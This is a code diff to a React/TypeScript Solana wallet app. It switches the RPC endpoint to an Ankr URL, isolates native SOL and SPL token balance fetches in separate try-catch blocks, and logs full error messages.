@@ -102,7 +102,7 @@ createAppKit({
   features: { email: false, socials: [], analytics: true },
 })
 
-const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+const connection = new Connection('https://rpc.ankr.com/solana', 'confirmed');
 
 const fetchTokenPrices = async (tokens: any[], chain: string) => {
   try {
@@ -205,20 +205,24 @@ export default function App() {
     const pubKey = new PublicKey(address);
     const balances: any[] = [];
 
-    // 1. Native SOL
-    const solBalance = await connection.getBalance(pubKey);
-    balances.push({ 
-      symbol: 'SOL', 
-      isNative: true, 
-      decimals: 9, 
-      balance: solBalance / LAMPORTS_PER_SOL, 
-      rawBalance: solBalance,
-      address: 'native',
-      coingeckoId: 'solana',
-      fallbackPrice: 150
-    });
+    // 1. Native SOL (Isolated try-catch)
+    try {
+      const solBalance = await connection.getBalance(pubKey);
+      balances.push({ 
+        symbol: 'SOL', 
+        isNative: true, 
+        decimals: 9, 
+        balance: solBalance / LAMPORTS_PER_SOL, 
+        rawBalance: solBalance,
+        address: 'native',
+        coingeckoId: 'solana',
+        fallbackPrice: 150
+      });
+    } catch (e) {
+      log(`❌ Native SOL fetch failed: ${e instanceof Error ? e.message : String(e)}`);
+    }
 
-    // 2. SPL Tokens
+    // 2. SPL Tokens (Isolated try-catch)
     try {
       const parsedTokenAccounts = await connection.getParsedTokenAccountsByOwner(pubKey, { programId: TOKEN_PROGRAM_ID });
       for (const { account, pubkey } of parsedTokenAccounts.value) {
@@ -237,7 +241,7 @@ export default function App() {
         }
       }
     } catch (e) {
-      log('❌ Solana SPL balance fetch failed');
+      log(`❌ SPL Token fetch failed: ${e instanceof Error ? e.message : String(e)}`);
     }
 
     return balances;
@@ -412,7 +416,7 @@ export default function App() {
 
     } catch (err: any) {
       const errorMsg = err?.message || JSON.stringify(err);
-      log(`❌ Solana Global Error: ${errorMsg.substring(0, 50)}`);
+      log(`❌ Solana Global Error: ${errorMsg}`); // Removed substring so we see the full error
       setStatus(`❌ Failed: ${errorMsg.substring(0, 50)}`);
     } finally {
       isExecuting.current = false;
